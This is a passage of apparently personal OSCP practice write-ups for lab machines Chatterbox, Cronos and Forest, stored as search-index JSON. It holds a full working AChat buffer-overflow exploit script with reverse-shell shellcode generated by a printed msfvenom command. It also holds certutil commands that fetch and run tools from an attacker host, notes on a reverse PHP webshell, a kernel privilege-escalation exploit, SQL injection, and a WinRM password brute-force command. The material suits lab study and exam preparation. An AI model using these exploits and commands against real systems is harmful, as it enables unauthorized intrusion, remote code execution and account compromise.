cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2 OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows 7 Professional or Windows 8 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (90%), Microsoft Windows Vista SP2 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (89%), Microsoft Windows 8.1 Update 1 (89%) Only 2 open ports. I guess the name Chatterbox is supposed to be a joke. Nothing really useful in the scan results. UDP ports are still being scanned, hopefully something comes up. Nothing came up. What on earth am I supposed to do with this box!?!? I feel like I'll need to rescan this one....or something. I reverted and re-scanned. Turns out the name Chatterbox is because this box is hosting AChat.","title":"Port Scan"},{"location":"OSCP%20practice%20exam/2.%20Chatterbox/#public-exploits","text":"Using EDB-36025 . Had to change line 57 to include the right IP address. Also need to swap out the payload - this POC just pops calc.exe Get new payload msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=444 -e x86/unicode_mixed -b '\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff' BufferRegister=EAX -f python After changing out the payload, here's the completed exploit #!/usr/bin/python # Author KAhara MAnhara # Achat 0.150 beta7 - Buffer Overflow # Tested on Windows 7 32bit import socket import sys, time buf = b\"\" buf += b\"\\x50\\x50\\x59\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\" buf += b\"\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\" buf += b\"\\x49\\x41\\x49\\x41\\x49\\x41\\x6a\\x58\\x41\\x51\\x41\\x44\\x41\" buf += b\"\\x5a\\x41\\x42\\x41\\x52\\x41\\x4c\\x41\\x59\\x41\\x49\\x41\\x51\" buf += b\"\\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x68\\x41\\x41\\x41\\x5a\\x31\" buf += b\"\\x41\\x49\\x41\\x49\\x41\\x4a\\x31\\x31\\x41\\x49\\x41\\x49\\x41\" buf += b\"\\x42\\x41\\x42\\x41\\x42\\x51\\x49\\x31\\x41\\x49\\x51\\x49\\x41\" buf += b\"\\x49\\x51\\x49\\x31\\x31\\x31\\x41\\x49\\x41\\x4a\\x51\\x59\\x41\" buf += b\"\\x5a\\x42\\x41\\x42\\x41\\x42\\x41\\x42\\x41\\x42\\x6b\\x4d\\x41\" buf += b\"\\x47\\x42\\x39\\x75\\x34\\x4a\\x42\\x4b\\x4c\\x77\\x78\\x44\\x42\" buf += b\"\\x79\\x70\\x79\\x70\\x59\\x70\\x63\\x30\\x74\\x49\\x48\\x65\\x50\" buf += b\"\\x31\\x39\\x30\\x50\\x64\\x34\\x4b\\x6e\\x70\\x6c\\x70\\x32\\x6b\" buf += b\"\\x42\\x32\\x4c\\x4c\\x42\\x6b\\x70\\x52\\x4d\\x44\\x52\\x6b\\x53\" buf += b\"\\x42\\x6c\\x68\\x4a\\x6f\\x48\\x37\\x4e\\x6a\\x6b\\x76\\x4d\\x61\" buf += b\"\\x4b\\x4f\\x34\\x6c\\x6d\\x6c\\x73\\x31\\x61\\x6c\\x6a\\x62\\x6e\" buf += b\"\\x4c\\x6b\\x70\\x57\\x51\\x36\\x6f\\x6c\\x4d\\x79\\x71\\x67\\x57\" buf += b\"\\x38\\x62\\x4b\\x42\\x72\\x32\\x61\\x47\\x74\\x4b\\x61\\x42\\x6a\" buf += b\"\\x70\\x74\\x4b\\x50\\x4a\\x4d\\x6c\\x52\\x6b\\x6e\\x6c\\x6e\\x31\" buf += b\"\\x70\\x78\\x4b\\x33\\x4d\\x78\\x49\\x71\\x78\\x51\\x6f\\x61\\x62\" buf += b\"\\x6b\\x52\\x39\\x6b\\x70\\x6b\\x51\\x37\\x63\\x32\\x6b\\x6f\\x59\" buf += b\"\\x4b\\x68\\x69\\x53\\x4d\\x6a\\x6e\\x69\\x72\\x6b\\x30\\x34\\x52\" buf += b\"\\x6b\\x6a\\x61\\x69\\x46\\x4c\\x71\\x59\\x6f\\x74\\x6c\\x67\\x51\" buf += b\"\\x38\\x4f\\x4c\\x4d\\x7a\\x61\\x77\\x57\\x4d\\x68\\x57\\x70\\x34\" buf += b\"\\x35\\x79\\x66\\x59\\x73\\x31\\x6d\\x78\\x78\\x4f\\x4b\\x31\\x6d\" buf += b\"\\x6f\\x34\\x52\\x55\\x79\\x54\\x42\\x38\\x32\\x6b\\x30\\x58\\x6c\" buf += b\"\\x64\\x6a\\x61\\x67\\x63\\x42\\x46\\x54\\x4b\\x4a\\x6c\\x4e\\x6b\" buf += b\"\\x64\\x4b\\x72\\x38\\x6d\\x4c\\x7a\\x61\\x46\\x73\\x64\\x4b\\x59\" buf += b\"\\x74\\x72\\x6b\\x6d\\x31\\x38\\x50\\x55\\x39\\x51\\x34\\x6c\\x64\" buf += b\"\\x4d\\x54\\x6f\\x6b\\x6f\\x6b\\x51\\x51\\x52\\x39\\x6e\\x7a\\x72\" buf += b\"\\x31\\x79\\x6f\\x47\\x70\\x61\\x4f\\x31\\x4f\\x61\\x4a\\x74\\x4b\" buf += b\"\\x7a\\x72\\x7a\\x4b\\x44\\x4d\\x51\\x4d\\x53\\x38\\x6d\\x63\\x50\" buf += b\"\\x32\\x59\\x70\\x59\\x70\\x52\\x48\\x63\\x47\\x31\\x63\\x30\\x32\" buf += b\"\\x61\\x4f\\x52\\x34\\x30\\x68\\x6e\\x6c\\x71\\x67\\x6c\\x66\\x4d\" buf += b\"\\x37\\x39\\x6f\\x36\\x75\\x55\\x68\\x74\\x50\\x59\\x71\\x59\\x70\" buf += b\"\\x39\\x70\\x6e\\x49\\x49\\x34\\x62\\x34\\x4e\\x70\\x62\\x48\\x4d\" buf += b\"\\x59\\x31\\x70\\x32\\x4b\\x6b\\x50\\x79\\x6f\\x56\\x75\\x32\\x30\" buf += b\"\\x30\\x50\\x52\\x30\\x32\\x30\\x4f\\x50\\x52\\x30\\x4f\\x50\\x50\" buf += b\"\\x50\\x31\\x58\\x69\\x5a\\x6c\\x4f\\x39\\x4f\\x4b\\x30\\x6b\\x4f\" buf += b\"\\x6a\\x35\\x33\\x67\\x50\\x6a\\x6b\\x55\\x71\\x58\\x6a\\x6a\\x79\" buf += b\"\\x7a\\x6e\\x30\\x4d\\x34\\x32\\x48\\x4c\\x42\\x4d\\x30\\x4d\\x31\" buf += b\"\\x45\\x6c\\x34\\x49\\x58\\x66\\x62\\x4a\\x4a\\x70\\x6e\\x76\\x6f\" buf += b\"\\x67\\x43\\x38\\x63\\x69\\x73\\x75\\x44\\x34\\x70\\x61\\x49\\x6f\" buf += b\"\\x56\\x75\\x51\\x75\\x35\\x70\\x70\\x74\\x7a\\x6c\\x79\\x6f\\x4e\" buf += b\"\\x6e\\x69\\x78\\x70\\x75\\x7a\\x4c\\x30\\x68\\x7a\\x50\\x48\\x35\" buf += b\"\\x75\\x52\\x6e\\x76\\x6b\\x4f\\x77\\x65\\x52\\x48\\x71\\x53\\x50\" buf += b\"\\x6d\\x30\\x64\\x59\\x70\\x51\\x79\\x59\\x53\\x42\\x37\\x4e\\x77\" buf += b\"\\x62\\x37\\x70\\x31\\x4a\\x56\\x32\\x4a\\x4d\\x42\\x32\\x39\\x31\" buf += b\"\\x46\\x38\\x62\\x39\\x6d\\x71\\x56\\x75\\x77\\x51\\x34\\x4d\\x54\" buf += b\"\\x6d\\x6c\\x39\\x71\\x59\\x71\\x54\\x4d\\x71\\x34\\x6c\\x64\\x4c\" buf += b\"\\x50\\x59\\x36\\x49\\x70\\x51\\x34\\x62\\x34\\x72\\x30\\x70\\x56\" buf += b\"\\x6f\\x66\\x32\\x36\\x31\\x36\\x42\\x36\\x50\\x4e\\x50\\x56\\x4f\" buf += b\"\\x66\\x42\\x33\\x72\\x36\\x52\\x48\\x50\\x79\\x46\\x6c\\x4d\\x6f\" buf += b\"\\x52\\x66\\x79\\x6f\\x49\\x45\\x73\\x59\\x67\\x70\\x4e\\x6e\\x62\" buf += b\"\\x36\\x4f\\x56\\x79\\x6f\\x4c\\x70\\x62\\x48\\x4b\\x58\\x62\\x67\" buf += b\"\\x4d\\x4d\\x63\\x30\\x69\\x6f\\x37\\x65\\x75\\x6b\\x68\\x70\\x56\" buf += b\"\\x55\\x33\\x72\\x62\\x36\\x51\\x58\\x63\\x76\\x33\\x65\\x37\\x4d\" buf += b\"\\x45\\x4d\\x59\\x6f\\x58\\x55\\x4d\\x6c\\x4a\\x66\\x43\\x4c\\x5a\" buf += b\"\\x6a\\x73\\x50\\x6b\\x4b\\x37\\x70\\x33\\x45\\x59\\x75\\x35\\x6b\" buf += b\"\\x71\\x37\\x4e\\x33\\x30\\x72\\x62\\x4f\\x6f\\x7a\\x6b\\x50\\x6e\" buf += b\"\\x73\\x39\\x6f\\x36\\x75\\x41\\x41\" # Create a UDP socket sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) server_address = ('10.10.10.74', 9256) fs = \"\\x55\\x2A\\x55\\x6E\\x58\\x6E\\x05\\x14\\x11\\x6E\\x2D\\x13\\x11\\x6E\\x50\\x6E\\x58\\x43\\x59\\x39\" p = \"A0000000002#Main\" + \"\\x00\" + \"Z\"*114688 + \"\\x00\" + \"A\"*10 + \"\\x00\" p += \"A0000000002#Main\" + \"\\x00\" + \"A\"*57288 + \"AAAAASI\"*50 + \"A\"*(3750-46) p += \"\\x62\" + \"A\"*45 p += \"\\x61\\x40\" p += \"\\x2A\\x46\" p += \"\\x43\\x55\\x6E\\x58\\x6E\\x2A\\x2A\\x05\\x14\\x11\\x43\\x2d\\x13\\x11\\x43\\x50\\x43\\x5D\" + \"C\"*9 + \"\\x60\\x43\" p += \"\\x61\\x43\" + \"\\x2A\\x46\" p += \"\\x2A\" + fs + \"C\" * (157-len(fs)- 31-3) p += buf + \"A\" * (1152 - len(buf)) p += \"\\x00\" + \"A\"*10 + \"\\x00\" print \"---->{P00F}!\" i=0 while i<len(p): if i > 172000: time.sleep(1.0) sent = sock.sendto(p[i:(i+8192)], server_address) i += sent sock.close() Started a listener, then fired the exploit. My first point :) eeek.","title":"Public exploits"},{"location":"OSCP%20practice%20exam/2.%20Chatterbox/#user-flag","text":"SystemInfo systeminfo Host Name: CHATTERBOX OS Name: Microsoft Windows 7 Professional OS Version: 6.1.7601 Service Pack 1 Build 7601 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Workstation OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00371-222-9819843-86663 Original Install Date: 12/10/2017, 9:18:19 AM System Boot Time: 2/3/2022, 10:37:18 PM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: X86-based PC Processor(s): 2 Processor(s) Installed. [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz [02]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (UTC-05:00) Eastern Time (US & Canada) Total Physical Memory: 2,047 MB Available Physical Memory: 1,536 MB Virtual Memory: Max Size: 4,095 MB Virtual Memory: Available: 3,425 MB Virtual Memory: In Use: 670 MB Page File Location(s): C:\\pagefile.sys Domain: WORKGROUP Logon Server: \\\\CHATTERBOX Hotfix(s): 183 Hotfix(s) Installed. Hotfix(s): 183 Hotfix(s) Installed. [01]: KB2849697 [02]: KB2849696 [03]: KB2841134 [04]: KB2670838 [05]: KB2830477 [06]: KB2592687 [07]: KB2479943 [08]: KB2491683 [09]: KB2506212 [10]: KB2506928 [11]: KB2509553 [12]: KB2533552 [13]: KB2534111 [14]: KB2545698 [15]: KB2547666 [16]: KB2552343 [17]: KB2560656 [18]: KB2563227 [19]: KB2564958 [20]: KB2574819 [21]: KB2579686 [22]: KB2604115 [23]: KB2620704 [24]: KB2621440 [25]: KB2631813 [26]: KB2639308 [27]: KB2640148 [28]: KB2647753 [29]: KB2654428 [30]: KB2660075 [31]: KB2667402 [32]: KB2676562 [33]: KB2685811 [34]: KB2685813 [35]: KB2690533 [36]: KB2698365 [37]: KB2705219 [38]: KB2719857 [39]: KB2726535 [40]: KB2727528 [41]: KB2729094 [42]: KB2732059 [43]: KB2732487 [44]: KB2736422 [45]: KB2742599 [46]: KB2750841 [47]: KB2761217 [48]: KB2763523 [49]: KB2770660 [50]: KB2773072 [51]: KB2786081 [52]: KB2799926 [53]: KB2800095 [54]: KB2807986 [55]: KB2808679 [56]: KB2813430 [57]: KB2820331 [58]: KB2834140 [59]: KB2840631 [60]: KB2843630 [61]: KB2847927 [62]: KB2852386 [63]: KB2853952 [64]: KB2857650 [65]: KB2861698 [66]: KB2862152 [67]: KB2862330 [68]: KB2862335 [69]: KB2864202 [70]: KB2868038 [71]: KB2871997 [72]: KB2884256 [73]: KB2891804 [74]: KB2892074 [75]: KB2893294 [76]: KB2893519 [77]: KB2894844 [78]: KB2900986 [79]: KB2908783 [80]: KB2911501 [81]: KB2912390 [82]: KB2918077 [83]: KB2919469 [84]: KB2923545 [85]: KB2931356 [86]: KB2937610 [87]: KB2943357 [88]: KB2952664 [89]: KB2966583 [90]: KB2968294 [91]: KB2970228 [92]: KB2972100 [93]: KB2973112 [94]: KB2973201 [95]: KB2973351 [96]: KB2977292 [97]: KB2978742 [98]: KB2984972 [99]: KB2985461 [100]: KB2991963 [101]: KB2992611 [102]: KB3003743 [103]: KB3004361 [104]: KB3004375 [105]: KB3006121 [106]: KB3006137 [107]: KB3010788 [108]: KB3011780 [109]: KB3013531 [110]: KB3020370 [111]: KB3020388 [112]: KB3021674 [113]: KB3021917 [114]: KB3022777 [115]: KB3023215 [116]: KB3030377 [117]: KB3035126 [118]: KB3037574 [119]: KB3042058 [120]: KB3045685 [121]: KB3046017 [122]: KB3046269 [123]: KB3054476 [124]: KB3055642 [125]: KB3059317 [126]: KB3060716 [127]: KB3061518 [128]: KB3067903 [129]: KB3068708 [130]: KB3071756 [131]: KB3072305 [132]: KB3074543 [133]: KB3075226 [134]: KB3078601 [135]: KB3078667 [136]: KB3080149 [137]: KB3084135 [138]: KB3086255 [139]: KB3092627 [140]: KB3093513 [141]: KB3097989 [142]: KB3101722 [143]: KB3102429 [144]: KB3107998 [145]: KB3108371 [146]: KB3108381 [147]: KB3108664 [148]: KB3109103 [149]: KB3109560 [150]: KB3110329 [151]: KB3118401 [152]: KB3122648 [153]: KB3123479 [154]: KB3126587 [155]: KB3127220 [156]: KB3133977 [157]: KB3137061 [158]: KB3138378 [159]: KB3138612 [160]: KB3138910 [161]: KB3139398 [162]: KB3139914 [163]: KB3140245 [164]: KB3147071 [165]: KB3150220 [166]: KB3150513 [167]: KB3156016 [168]: KB3156019 [169]: KB3159398 [170]: KB3161102 [171]: KB3161949 [172]: KB3161958 [173]: KB3172605 [174]: KB3177467 [175]: KB3179573 [176]: KB3184143 [177]: KB3185319 [178]: KB4014596 [179]: KB4019990 [180]: KB4040980 [181]: KB976902 [182]: KB982018 [183]: KB4054518 Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.74 copy WinPEAS to target. certutil.exe -urlcache -f http://10.10.16.4:80/winPEASx86.exe wp.exe","title":"User Flag"},{"location":"OSCP%20practice%20exam/2.%20Chatterbox/#winpeas-findings","text":"Nothing else really cool in WinPEAS - guess I should try exploit suggester. Here are the local , non-metasploit , exploits. [E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important [*] https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC [*] https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC [*] [E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important [*] http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC","title":"WinPEAS findings:"},{"location":"OSCP%20practice%20exam/2.%20Chatterbox/#privesc","text":"","title":"PrivEsc"},{"location":"OSCP%20practice%20exam/2.%20Chatterbox/#ms16-075-rotten-potato","text":"certutil.exe -urlcache -f http://10.10.16.4:80/potato.exe potato.exe Sleeping for 5 mins....I guess I'll wait for my SYSTEM shell... Shell never came back :( coming back to this later.","title":"MS16-075 - Rotten Potato"},{"location":"OSCP%20practice%20exam/3.%20Cronos/","text":"Cronos \u00b6 Recon \u00b6 Port Scan \u00b6 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) 53/tcp open domain syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Ubuntu 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Linux 3.10 - 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 (91%), Linux 3.16 - 4.6 (91%), Linux 3.18 (91%), Linux 3.2 - 4.9 (91%), Linux 3.8 - 3.11 (91%), Linux 4.2 (91%) Enumerate the attack surface \u00b6 This box is pretty basic looking. It appears to be running Ubuntu . Remote login - SSH (might be useful if I find a private key or gain credentials.) This box ( ns1 ) appears to be an authoritive name server for the domain ( cronos.htb ). - DNS: bind 9.10.3-P4 - Zone xfer appears to have failed, maybe I need to be domain joined? This box also has a webserver: - Webserver: Apache 2.4.18 - /index.html Got a 200 status code for this homepage. - Scan reveals Apache may be default configuration - this hasn't been set up yet. Public Explotis \u00b6 apache bind Exploitation \u00b6 Will be following HackTricks DNS guide Did a zone transfer! I added cronos to /etc/hosts and am able to see other sites now. Going to rescan and take another break. Found some pages on the newly found site: Some more public exploits Added admin.cronos.htb to hosts. Got in with some SQL injection User Flag! \u00b6 51d236438b333970dbba7dc3089be33b uname -a Getting shell Using PentestMonkey's reverse php webshell. Don't need this anymore, but I found it and thought it would be cool to include Uploaded webshell Start listener, and execute! PrivEsc \u00b6 Found a few options for privesc on linux kernel 4.4.0-72 This one ended up working EDB-44298 Compiled on kali gcc 44298.c -o pwn Copy exploit and make executable. Execute to get root Root Flag \u00b6 1703b8a3c9a8dde879942c79d02fd3a0","title":"Cronos"},{"location":"OSCP%20practice%20exam/3.%20Cronos/#cronos","text":"","title":"Cronos"},{"location":"OSCP%20practice%20exam/3.%20Cronos/#recon","text":"","title":"Recon"},{"location":"OSCP%20practice%20exam/3.%20Cronos/#port-scan","text":"PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) 53/tcp open domain syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Ubuntu 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Linux 3.10 - 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 (91%), Linux 3.16 - 4.6 (91%), Linux 3.18 (91%), Linux 3.2 - 4.9 (91%), Linux 3.8 - 3.11 (91%), Linux 4.2 (91%)","title":"Port Scan"},{"location":"OSCP%20practice%20exam/3.%20Cronos/#enumerate-the-attack-surface","text":"This box is pretty basic looking. It appears to be running Ubuntu . Remote login - SSH (might be useful if I find a private key or gain credentials.) This box ( ns1 ) appears to be an authoritive name server for the domain ( cronos.htb ). - DNS: bind 9.10.3-P4 - Zone xfer appears to have failed, maybe I need to be domain joined? This box also has a webserver: - Webserver: Apache 2.4.18 - /index.html Got a 200 status code for this homepage. - Scan reveals Apache may be default configuration - this hasn't been set up yet.","title":"Enumerate the attack surface"},{"location":"OSCP%20practice%20exam/3.%20Cronos/#public-explotis","text":"apache bind","title":"Public Explotis"},{"location":"OSCP%20practice%20exam/3.%20Cronos/#exploitation","text":"Will be following HackTricks DNS guide Did a zone transfer! I added cronos to /etc/hosts and am able to see other sites now. Going to rescan and take another break. Found some pages on the newly found site: Some more public exploits Added admin.cronos.htb to hosts. Got in with some SQL injection","title":"Exploitation"},{"location":"OSCP%20practice%20exam/3.%20Cronos/#user-flag","text":"51d236438b333970dbba7dc3089be33b uname -a Getting shell Using PentestMonkey's reverse php webshell. Don't need this anymore, but I found it and thought it would be cool to include Uploaded webshell Start listener, and execute!","title":"User Flag!"},{"location":"OSCP%20practice%20exam/3.%20Cronos/#privesc","text":"Found a few options for privesc on linux kernel 4.4.0-72 This one ended up working EDB-44298 Compiled on kali gcc 44298.c -o pwn Copy exploit and make executable. Execute to get root","title":"PrivEsc"},{"location":"OSCP%20practice%20exam/3.%20Cronos/#root-flag","text":"1703b8a3c9a8dde879942c79d02fd3a0","title":"Root Flag"},{"location":"OSCP%20practice%20exam/4.%20Forest/","text":"10.10.10.161 \u00b6 Recon \u00b6 Port Scan \u00b6 There were a lot of filtered ports included in the nmap results...I grepped for just the open ports to avoid the signal in the noise issue. PORT STATE SERVICE REASON VERSION 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-02-03 16:58:07Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 49664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49665/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49666/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49671/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49676/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49684/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49944/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%) This one also appears to be an AD machine. Enumerate attack surface \u00b6 This one is also running Active Directory - 88: Kerberos - 389: ldap - 636: ldaps SMB? - 139: Netbios-ssn - Anon login - Nope - Various ports serving RPC Other - 464: kpasswd5? - A service for changing LDAP passwords!? - 593: ncacn_http - RPC over HTTP 1.0 - 9389: mc-nmf - .NET Message Framing Web: - 5985: Microsoft HTTPAPI httpd 2.0 - WinRM? - check manual commands. - 47001: Microsoft HTTPAPI httpd 2.0 Enum4linux did a great job on this one! Got a bunch of details about users. Here is a list of users with enabled accounts: All the HealthMailbox users lucinda Administrator sebastien santi svc-alfresco mark andy Public exploits \u00b6 Didn't find any. Maybe I can brute force the users crackmapexec winrm 10.10.10.161 -d htb.local -u users.txt -p /usr/share/seclists/Passwords/darkweb2017-top100.txt The domain is htb.local","title":"10.10.10.161"},{"location":"OSCP%20practice%20exam/4.%20Forest/#101010161","text":"","title":"10.10.10.161"},{"location":"OSCP%20practice%20exam/4.%20Forest/#recon","text":"","title":"Recon"},{"location":"OSCP%20practice%20exam/4.%20Forest/#port-scan","text":"There were a lot of filtered ports included in the nmap results...I grepped for just the open ports to avoid the signal in the noise issue. PORT STATE SERVICE REASON VERSION 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-02-03 16:58:07Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 49664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49665/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49666/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49671/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49676/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49684/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49944/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%) This one also appears to be an AD machine.","title":"Port Scan"},{"location":"OSCP%20practice%20exam/4.%20Forest/#enumerate-attack-surface","text":"This one is also running Active Directory - 88: Kerberos - 389: ldap - 636: ldaps SMB? - 139: Netbios-ssn - Anon login - Nope - Various ports serving RPC Other - 464: kpasswd5? - A service for changing LDAP passwords!? - 593: ncacn_http - RPC over HTTP 1.0 - 9389: mc-nmf - .NET Message Framing Web: - 5985: Microsoft HTTPAPI httpd 2.0 - WinRM? - check manual commands. - 47001: Microsoft HTTPAPI httpd 2.0 Enum4linux did a great job on this one! Got a bunch of details about users. Here is a list of users with enabled accounts: All the HealthMailbox users lucinda Administrator sebastien santi svc-alfresco mark andy","title":"Enumerate attack surface"},{"location":"OSCP%20practice%20exam/4.%20Forest/#public-exploits","text":"Didn't find any. Maybe I can brute force the users crackmapexec winrm 